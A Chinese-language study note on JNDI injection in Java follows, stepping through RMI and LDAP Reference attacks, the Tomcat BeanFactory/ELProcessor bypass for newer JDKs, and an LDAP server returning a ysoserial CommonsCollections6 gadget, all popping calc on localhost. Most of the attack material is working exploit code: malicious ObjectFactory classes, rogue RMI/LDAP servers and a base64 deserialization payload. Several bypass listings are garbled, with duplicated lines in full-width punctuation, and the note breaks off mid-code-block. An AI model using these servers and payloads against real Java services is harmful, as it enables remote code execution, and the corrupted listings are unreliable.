[Trail：Java 命名与目录接口（Java™ 教程） --- Trail: Java Naming and Directory Interface (The Java™ Tutorials)](https://docs.oracle.com/javase/tutorial/jndi/)官方文档
[JNDI 教程 --- The JNDI Tutorial](https://docs.oracle.com/javase/jndi/tutorial/)
# 什么是jndi
根据官方文档，JNDI 全称为 **Java Naming and Directory Interface**，即 Java 名称与目录接口。也就是一个名字对应一个 Java 对象。

也就是一个字符串对应一个对象。

jndi 在 jdk 里面支持以下四种服务

- LDAP：轻量级目录访问协议
- 通用对象请求代理架构(CORBA)；通用对象服务(COS)名称服务
- Java 远程方法调用(RMI) 注册表
- DNS 服务

前三种都是字符串对应对象，DNS 是 IP 对应域名。


## jndi 的代码以及包说明

JNDI 主要是上述四种服务，对应四个包加一个主包  
JNDI 接口主要分为下述 5 个包:

- [javax.naming](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/naming.html)
- [javax.naming.directory](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/directory.html)
- [javax.naming.event](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/event.html)
- [javax.naming.ldap](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/ldap.html)
- [javax.naming.spi](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/provider.html)

其中最重要的是 `javax.naming` 包，包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。 以上述打印机服务为例，通过 JNDI 接口，用户可以透明地调用远程打印服务，伪代码如下所示:

```java
Context ctx = new InitialContext(env);  
Printer printer = (Printer)ctx.lookup("myprinter");  
printer.print(report);
```
Jndi 在对不同服务进行调用的时候，会去调用 xxxContext 这个类，比如调用 RMI 服务的时候就是调的 RegistryContext，这一点是很重要的，记住了这一点对于 JNDI 这里的漏洞理解非常有益。

一般的应用也就是先 `new InitialContext()`也就是new一个原始上下文，再调用 API ，例如刚说的注册表上下文（RegistryContext）

通过查询官方文档可以看到![[Pasted image 20251220231331.png]]
JNDI机制允许绑定这五种对象
- Java可序列化对象
- Reference 对象也就是引用对象
- 具有属性的对象
- RMI远程对象
- CORBA对象


下面我们先看一个 JNDI 结合 RMI 远程对象的代码实例。


# JNDI 的利用方式，代码以及一些漏洞

## Jndi & RMI
服务端
```java
package com.example.demo.Jndi;  
  
  
import com.example.demo.RMI.RMIServer;  
  
import javax.naming.InitialContext;  
import java.rmi.Naming;  
import java.rmi.Remote;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.server.UnicastRemoteObject;  
  
public class JndiRMIServer {  
    public interface RemoteObjImpl extends Remote {  
         String sayHello(String a) throws RemoteException;  
    }  
  
  
  
    public static class RemoteObj extends UnicastRemoteObject implements  JndiRMIServer.RemoteObjImpl {  
        public RemoteObj() throws RemoteException {  
            super();  
        }  
  
        @Override  
        public String sayHello(String a) throws RemoteException {  
            System.out.println(a);  
            return "Say world";  
        }  
    }  
  
    private void start() throws Exception {  
        RemoteObj h = new RemoteObj();  
        LocateRegistry.createRegistry(1099);  
        InitialContext initialContext = new InitialContext();  
        initialContext.rebind("rmi://localhost:1099/remoteObj", h);  
    }  
  
  
    public static void main(String[] args) throws Exception{  
        JndiRMIServer jndiRMIServer = new JndiRMIServer();  
        jndiRMIServer.start();  
    }  
}
```

客户端
```java
package com.example.demo.Jndi.RMI;  
  
import com.example.demo.Jndi.JndiRMIServer;  
  
import javax.naming.InitialContext;  
public class JndiRMIClient {  
    public static void main(String[] args) throws Exception{  
        InitialContext initialContext = new InitialContext();  
        JndiRMIServer.RemoteObjImpl remoteObj = (JndiRMIServer.RemoteObjImpl) initialContext.lookup("rmi://localhost:1099/remoteObj");  
        System.out.println(remoteObj.sayHello("hello"));  
    }  
}
```

### RMI原生漏洞
这里调用的api是JNDI的服务的，但事实上真正执行的代码还是RMI的库里的，我们打断点看看，就看看走没走到RMI的库中的`lookup()`方法

断点打在lookup()方法这里![[Pasted image 20251220211602.png]]
再继续跟进，步入lookup()中
进去到这里在继续跟lookup()
![[Pasted image 20251220212230.png]]
发现到了 `RegistryContext`也就是RMI对应lookup()方法的类，我们可以看到这个registry属性的值就是我们的`Stub`对象。至此可以基本说明JNDI调用RMI服务的时候调用了原生的RMI服务
![[Pasted image 20251220212755.png]]
 所以说，如果 JNDI 这里是和 RMI 结合起来使用的话，RMI 中存在的漏洞，JNDI 这里也会有。但这并不是 JNDI 的传统意义上的漏洞。


### 引用对象 （Jndi注入）
适用版本： jdk8u121 

java设计这个引用对象的初中是什么呢？
假如我们的对象不满足上述除了引用对象的四种，我们还想把他进行绑定，那我们就可以绑定这个引用对象，在这个引用对象里面进行转换，来调用我们想要的对象，那我们的攻击面就也很大了对吧。

如果把绑定的远程对象
改为绑定一个 `Reference`一个引用
```java
private void start() throws Exception {  
   // RemoteObj h = new RemoteObj();  
    Reference h2 = new Reference("calc", "calc", "http://localhost:7777");  
    LocateRegistry.createRegistry(1099);  
    InitialContext initialContext = new InitialContext();  
    initialContext.rebind("rmi://localhost:1099/remoteObj", h2);  
}
```
看看引用里面的几个参数代表什么
第一个是类名，第二个是工厂，第三个是工厂地址
![[Pasted image 20251220225108.png]]
这个就有点像一个代理，或者是一个装饰器嘛，我们调用这个引用对象的时候，就会执行这个工厂里面的逻辑，也就是可以执行任意恶意代码了 

注意，第一个类名，本质上是直接引用的对象
第二个工厂，是执行代码的对象
第三个是远程加载的地址

也就是说，我们的攻击流程应该放在第二个工厂类里

从攻击的角度来看，第一个类显得很多余
但从开发来看
**第一个参数的作用**就是告诉 JNDI 客户端：“虽然你现在拿到的只是一个引用，但它最终对应的类应该是 `xxx`。” 这样 JVM 才知道如何处理这个对象，以及是否符合类型检查。


我们先把代码贴上去
client：
```java
package com.example.demo.Jndi.RMI;  
  
import com.example.demo.Jndi.JndiRMIServer;  
  
import javax.naming.InitialContext;  
public class JndiRMIClient {  
    public static void main(String[] args) throws Exception{  
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");  
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");  
        InitialContext initialContext = new InitialContext();  
        JndiRMIServer.IRemoteObj remoteObj =  
            (JndiRMIServer.IRemoteObj) initialContext.lookup("rmi://127.0.0.1:1099/exec");  
        System.out.println(remoteObj.sayHello("hello"));  
    }  
}
```
客户端没什么太多要讲的 ，下面是设置可以从远程加载对象，防止复现失败
```java
System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");  
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");  
```


server端：
```java
package com.example.demo.Jndi.Reference;  
  
import javax.naming.InitialContext;  
import javax.naming.Reference;  
import java.rmi.registry.LocateRegistry;  
public class ReServer {  
        private void start() throws Exception {  
            Reference h2 = new Reference("CLASS", "T", "http://localhost:7777/");  
            LocateRegistry.createRegistry(1099);  
            InitialContext initialContext = new InitialContext();  
            initialContext.rebind("rmi://127.0.0.1:1099/exec", h2);  
        }  
  
        public static void main(String[] args) throws Exception{  
            ReServer reServer = new ReServer();  
            reServer.start();  
        }  
    }
```
服务端主要就是绑定Reference的地方，我们要把引用对象和执行恶意代码的类，和地址绑定上去

恶意类T
```java
import javax.naming.Context;  
import javax.naming.Name;  
import javax.naming.spi.ObjectFactory;  
import java.io.IOException;  
import java.util.Hashtable;  
public class T  implements ObjectFactory {  
    public T() throws IOException{  
        Runtime.getRuntime().exec("calc");  
    }  
    @Override  
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {  
        return new CLASS();  
    }  
}
```
这个执行代码的地方一定要继承ObjectFactory，让JVM知道你这是一个工厂类，重写的返回值应该为我们刚刚填写的第一个参数CLASS类


直接引用的对象CLASS：
```java
import java.io.Serializable;  
public class CLASS implements Serializable {  
    public CLASS() {  
        System.out.println("直接引用绑定");  
    }  
}
```
这就不重要了，有个构造函数就行，随便写。

最后，我们可以看到报错，但是我们恶意代码是执行了的。
![[Pasted image 20251221181606.png]]

这个漏洞在 jdk8u121 当中被修复，也就是 `lookup()` 方法只可以对本地进行 `lookup()` 方法的调用。

攻击点的关键主要在于我们能否控制Reference的地址，我们就可以在我们的VPS上放恶意对象。

---

## Jndi & Idap

### 什么是ldap
idap是一种协议，并非java独有

举一个生活中的例子，假如一个人数庞大的公司，如果每个部门每个系统都存一份自己的员工表，改个密码要改成百上千次，于是公司建立了一个大账本，所有人都去这里查，这个查帐本的动作和规范，就是LDAP

LDAP是树状结构的
不像mysql是个表，而是像文件夹一样的
并且读 极快
修改，比较慢，一般不存放账户余额啦这种需要经常变更的信息

LDAP 的请求和响应是 **ASN.1** 格式，使用二进制的 BER 编码，操作类型(Operation)包括 Bind/Unbind、Search、Modify、Add、Delete、Compare 等等，除了这些常规的增删改查操作，同时也包含一些拓展的操作类型和异步通知事件。

### ldap的JNDI漏洞
前言：
JNDI支持很多种对象，比如我们刚才讲的RMI对象对吧
每一个对象在底层具体实现的时候都会有一个类叫`XXXContext`
在这些洞被爆出来之后，官方在`XXXContext`加了一些代码
但我们知道支持远程对象的有：RMI 、CORBA、Idap

其中在jdk8u_121的时候，只修补了RMI、CORBA
ldap这个漏网之鱼在jdk8u_191的时候才修复

所以我们jdk版本在这之间的时候可以考虑打ldap的JNDI漏洞

首先我们得想办法起一个LDAP服务，因为这个并非java专属，有很多种办法。

我们就用java起，首先导入依赖
```xml
<dependency>  
 <groupId>com.unboundid</groupId>  
 <artifactId>unboundid-ldapsdk</artifactId>  
 <version>3.2.0</version>  
 <scope>test</scope>  
</dependency>
```
对应的server的代码
LdapServer.java

```java
package com.example.demo.Ldap;  
import com.unboundid.ldap.listener.InMemoryDirectoryServer;  
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  
import com.unboundid.ldap.listener.InMemoryListenerConfig;  
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  
import com.unboundid.ldap.sdk.Entry;  
import com.unboundid.ldap.sdk.LDAPException;  
import com.unboundid.ldap.sdk.LDAPResult;  
import com.unboundid.ldap.sdk.ResultCode;  
import javax.net.ServerSocketFactory;  
import javax.net.SocketFactory;  
import javax.net.ssl.SSLSocketFactory;  
import java.net.InetAddress;  
import java.net.MalformedURLException;  
import java.net.URL;  
  
public class LdapServer {  
    private static final String LDAP_BASE = "dc=example,dc=com";  
    public static void main (String[] args) {  
        String url = "http://127.0.0.1:8000/#T";  
        int port = 1234;  
        try {  
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);  
            config.setListenerConfigs(new InMemoryListenerConfig(  
                    "listen",  
                    InetAddress.getByName("0.0.0.0"),  
                    port,  
                    ServerSocketFactory.getDefault(),  
                    SocketFactory.getDefault(),  
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));  
  
            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));  
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);  
            System.out.println("Listening on 0.0.0.0:" + port);  
            ds.startListening();  
        }  
        catch ( Exception e ) {  
            e.printStackTrace();  
        }  
    }  
    private static class OperationInterceptor extends InMemoryOperationInterceptor {  
        private URL codebase;  
        /**  
         * */ public OperationInterceptor ( URL cb ) {  
            this.codebase = cb;  
        }  
        /**  
         * {@inheritDoc}  
         * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)         */ @Override  
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {  
            String base = result.getRequest().getBaseDN();  
            Entry e = new Entry(base);  
            try {  
                sendResult(result, base, e);  
            }  
            catch ( Exception e1 ) {  
                e1.printStackTrace();  
            }  
        }  
        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {  
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));  
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);  
            e.addAttribute("javaClassName", "Exploit");  
            String cbstring = this.codebase.toString();  
            int refPos = cbstring.indexOf('#');  
            if ( refPos > 0 ) {  
                cbstring = cbstring.substring(0, refPos);  
            }  
            e.addAttribute("javaCodeBase", cbstring);  
            e.addAttribute("objectClass", "javaNamingReference");  
            e.addAttribute("javaFactory", this.codebase.getRef());  
            result.sendSearchEntry(e);  
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));  
        }  
  
    }  
}

```
客户端是类似的，不过是把RMI服务换成ldap服务
```java
package com.example.demo.Ldap;  
  
import com.example.demo.Jndi.JndiRMIServer;  
  
import javax.naming.InitialContext;  
public class LdapClient {  
    public static void main(String[] args) throws Exception{  
        InitialContext initialContext = new InitialContext();  
        JndiRMIServer.RemoteObj remoteObj = (JndiRMIServer.RemoteObj) initialContext.lookup("ldap://localhost:1234/AnyName");  
        System.out.println(remoteObj.sayHello("hello"));  
    }  
}
```
这里的攻击方式还是我们刚才说的 `Reference`
值得注意的是LDAP+`Reference`的技巧远程加载`Factory`不受RMI+Reference中的
`com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase`等属性的限制，所以适用范围更广。但在`JDK 8u191、7u201、6u211`之后，`com.sun.jndi.ldap.object.trustURLCodebase`属性的默认值被设置为false，对`LDAP Reference`远程工厂类的加载增加了限制。

所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。

因此，这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下。
![[Pasted image 20251221215624.png]]


#### jdk高版本绕过 

针对的就是 jdk8u191、7u201 这些的高版本 jdk 的绕过手段。

jdk版本在8u191之前可以通过刚刚说的打ldap

这里的 jdk 版本是 **jdk8u121 < temp < jdk8u191**

jdk版本在8u191之后我们也有绕过方式
我们先来看看在8u191的时候的更新打了什么补丁吧

```java
// 旧版本JDK  
 /**  
 * @param className A non-null fully qualified class name.  
 * @param codebase A non-null, space-separated list of URL strings.  
 */  
 public Class<?> loadClass(String className, String codebase)  
 throws ClassNotFoundException, MalformedURLException {  
  
 ClassLoader parent = getContextClassLoader();  
 ClassLoader cl =  
 URLClassLoader.newInstance(getUrlArray(codebase), parent);  
  
 return loadClass(className, cl);  
 }  
  
  
// 新版本JDK  
 /**  
 * @param className A non-null fully qualified class name.  
 * @param codebase A non-null, space-separated list of URL strings.  
 */  
 public Class<?> loadClass(String className, String codebase)  
 throws ClassNotFoundException, MalformedURLException {  
 if ("true".equalsIgnoreCase(trustURLCodebase)) {  
 ClassLoader parent = getContextClassLoader();  
 ClassLoader cl =  
 URLClassLoader.newInstance(getUrlArray(codebase), parent);  
  
 return loadClass(className, cl);  
 } else {  
 return null;  
 }  
 }
```
可以看到，只有当允许加载远程Codebase的时候，才会进行接下来的逻辑，但是默认值是false。也就无法进行URLClassLoader的攻击了
那我们讲讲jdk8u191之后的绕过手段

---

>主要的攻击方式是利用本地恶意Class作为 `Reference Factory`
（由于我们无法从远程加载一个恶意的工厂，那我们可不可以从本地找一个像cc链子中`InvokeTransformer`那样的可以利用的工厂呢？）

#### 1.利用本地恶意Class作为Reference Factory
利用条件：依赖tomcat8，通过EL表达式来命令执行，并且只要有tomcat-8就能打，jdk版本没限制

由于工厂一定要继承 `ObjectFactory`接口，那我们就去找这个接口的实现类。

最终找到了 `BeanFactory`这个类，其中通过反射执行方法
并且传入的参数可控，也许就可以命令执行
![[Pasted image 20251222211050.png]]
服务端

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;  
import org.apache.naming.ResourceRef;  
  
import javax.naming.StringRefAddr;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
  
// JNDI 高版本 jdk 绕过服务端  
public class JNDIBypassHighJava {  
    public static void main(String[] args) throws Exception {  
        public static void main（String[] args） throw Exception {  
            System.out.println("[*]Evil RMI Server is Listening on port: 1099");  
            System.out.println（“[*]Evil RMI Server is Listening on port： 1099”）;  
            Registry registry = LocateRegistry.createRegistry( 1099);  
            Registry  registry = LocateRegistry.createRegistry（ 1099）;  
            // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory  
            实例化 Reference，指定目标类为 javax.el.ELProcessor，工厂类为 org.apache.naming.factory.BeanFactory  
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",  
                    ResourceRef  ref = new ResourceRef（“javax.el.ELProcessor”， null， “”， “”，  
            true,"org.apache.naming.factory.BeanFactory",null);  
            true，“org.apache.naming.factory.BeanFactory”，null）;  
            // 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码  
            ref.add(new StringRefAddr("forceString", "x=eval"));  
            ref.add（new StringRefAddr（“forceString”， “x=eval”））;  
            // 利用表达式执行命令  
            ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +  
                    ref.add（new StringRefAddr（“x”， “\”\“.getClass（）.forName（\”javax.script.ScriptEngineManager\“）” +  
                    ".newInstance().getEngineByName(\"JavaScript\")" +  
“.newInstance（）.getEngineByName（\”JavaScript\“）” +  
                    ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));  
“.eval（\”new java.lang.ProcessBuilder['（java.lang.String[]）']（['calc']）.start（）\“）”“）;  
            System.out.println("[*]Evil command: calc");  
            System.out.println（“[*]Evil command： calc”）;  
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);  
            ReferenceWrapper referenceWrapper = new ReferenceWrapper（ref）;  
            registry.bind("Object", referenceWrapper);  
            registry.bind（“Object”，referenceWrapper）;  
        }  
    }
```

rebind方法服务端
```java
import org.apache.naming.ResourceRef;    
    
import javax.naming.InitialContext;    
import javax.naming.StringRefAddr;    
    
public class JNDIBypassHighJavaServerRebind {    
    public static void main(String[] args) throws Exception{    
public static void main（String[] args） throw Exception{  
    
        InitialContext initialContext = new InitialContext();    
InitialContext initialContext = new InitialContext（）;  
 ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor",null,"","",    
ResourceRef resourceRef = new ResourceRef（“javax.el.ELProcessor”，null，“”，“”，  
 true,"org.apache.naming.factory.BeanFactory",null );    
true，“org.apache.naming.factory.BeanFactory”，null ）;  
 resourceRef.add(new StringRefAddr("forceString", "x=eval"));    
resourceRef.add（new StringRefAddr（“forceString”， “x=eval”））;  
 resourceRef.add(new StringRefAddr("x","Runtime.getRuntime().exe('calc')" ));    
resourceRef.add（new StringRefAddr（“x”，“Runtime.getRuntime（）.exe（'calc'）”））;  
 initialContext.rebind("rmi://localhost:1099/remoteObj", resourceRef);    
initialContext.rebind（“rmi://localhost:1099/remoteObj”，resourceRef）;  
 }    
}
```


客户端
```java
import javax.naming.Context;    
import javax.naming.InitialContext;    
    
public class JNDIBypassHighJavaClient {    
    public static void main(String[] args) throws Exception {    
        String uri = "rmi://localhost:1099/Object";    
 Context context = new InitialContext();    
 context.lookup(uri);    
 }    
}
```



#### 绕过手法2：利用LDAP返回序列化数据，触发本地Gadget
>由于fastjson还没学，笔记这里先粘一下别人的

LDAP 服务端除了支持 JNDI Reference 这种利用方式外，还支持直接返回一个序列化的对象。如果 Java 对象的 javaSerializedData 属性值不为空，则客户端的 `obj.decodeObject()` 方法就会对这个字段的内容进行反序列化。此时，如果服务端 ClassPath 中存在反序列化咯多功能利用 Gadget 如 CommonsCollections 库，那么就可以结合该 Gadget 实现反序列化漏洞攻击。

使用 ysoserial 工具生成 Commons-Collections 这条 Gadget 并进行 Base64 编码输出：

当然，这个用自己的 EXP 输出也行。

`java -jar ysoserial-master.jar CommonsCollections6 'calc' | base64`
输出如下
`rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=`

恶意 LDAP 服务器如下，主要是在 javaSerializedData 字段内填入刚刚生成的反序列化 payload 数据：

```java
import com.unboundid.util.Base64;    
import com.unboundid.ldap.listener.InMemoryDirectoryServer;    
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;    
import com.unboundid.ldap.listener.InMemoryListenerConfig;    
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;    
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;    
import com.unboundid.ldap.sdk.Entry;    
import com.unboundid.ldap.sdk.LDAPException;    
import com.unboundid.ldap.sdk.LDAPResult;    
import com.unboundid.ldap.sdk.ResultCode;    
    
import javax.net.ServerSocketFactory;    
import javax.net.SocketFactory;    
import javax.net.ssl.SSLSocketFactory;    
import java.net.InetAddress;    
import java.net.MalformedURLException;    
import java.net.URL;    
import java.text.ParseException;    
    
public class JNDIGadgetServer {    
    
    private static final String LDAP_BASE = "dc=example,dc=com";    
    
    
 public static void main (String[] args) {    
    
        String url = "http://vps:8000/#ExportObject";    
 int port = 1234;    
    
    
 try {    
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);    
 config.setListenerConfigs(new InMemoryListenerConfig(    
                    "listen",    
 InetAddress.getByName("0.0.0.0"),    
 port,    
 ServerSocketFactory.getDefault(),    
 SocketFactory.getDefault(),    
 (SSLSocketFactory) SSLSocketFactory.getDefault()));    
    
 config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));    
 InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);    
 System.out.println("Listening on 0.0.0.0:" + port);    
 ds.startListening();    
    
 }    
        catch ( Exception e ) {    
            e.printStackTrace();    
 }    
    }    
    
    private static class OperationInterceptor extends InMemoryOperationInterceptor {    
    
        private URL codebase;    
    
    
 /**    
 * */ public OperationInterceptor ( URL cb ) {    
            this.codebase = cb;    
 }    
    
    
        /**    
 * {@inheritDoc}    
 * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)    
 */ @Override    
 public void processSearchResult ( InMemoryInterceptedSearchResult result ) {    
            String base = result.getRequest().getBaseDN();    
 Entry e = new Entry(base);    
 try {    
                sendResult(result, base, e);    
 }    
            catch ( Exception e1 ) {    
                e1.printStackTrace();    
 }    
    
        }    
    
    
        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {    
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));    
 System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);    
 e.addAttribute("javaClassName", "Exploit");    
 String cbstring = this.codebase.toString();    
 int refPos = cbstring.indexOf('#');    
 if ( refPos > 0 ) {    
                cbstring = cbstring.substring(0, refPos);    
 }    
    
            // Payload1: 利用LDAP+Reference Factory    
//            e.addAttribute("javaCodeBase", cbstring);    
//            e.addAttribute("objectClass", "javaNamingReference");    
//            e.addAttribute("javaFactory", this.codebase.getRef());    
    
 // Payload2: 返回序列化Gadget    
 try {    
                e.addAttribute("javaSerializedData", Base64.decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg="));    
 } catch (ParseException exception) {    
                exception.printStackTrace();    
 }    
    
            result.sendSearchEntry(e);    
 result.setResult(new LDAPResult(0, ResultCode.SUCCESS));    
 }    
    
    }    
}
```

依赖需要 cc依赖和fastjson
客户端代码，这里有两种触发方式，选一种就好了，我这里 fastjson 还没学过，就先用第一种的 lookup 注入。

```java
